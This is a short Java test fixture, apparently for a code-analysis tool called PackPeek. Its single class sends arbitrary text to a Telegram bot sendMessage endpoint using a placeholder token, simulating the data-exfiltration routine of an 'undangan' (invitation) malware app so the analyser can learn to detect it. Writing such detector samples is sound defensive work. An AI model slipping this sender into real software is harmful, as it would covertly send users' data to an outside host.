package sim.packpeek.undangan;

import java.net.HttpURLConnection;
import java.net.URL;

/**
 * TEST SAMPLE ONLY. The bot token is fake and the code never runs (hasCode="false"). It exists so
 * PackPeek's code analysis can recognise the Telegram exfiltration pattern.
 */
final class Sender {
    private static final String BOT =
        "https://api.telegram.org/bot123456789:SIMULATIONxONLYxNOTxAxREALxTOKENxxx/sendMessage?chat_id=0&text=";

    static void send(String text) {
        try {
            HttpURLConnection connection = (HttpURLConnection) new URL(BOT + text).openConnection();
            connection.getResponseCode();
        } catch (Exception ignored) {
        }
    }
}
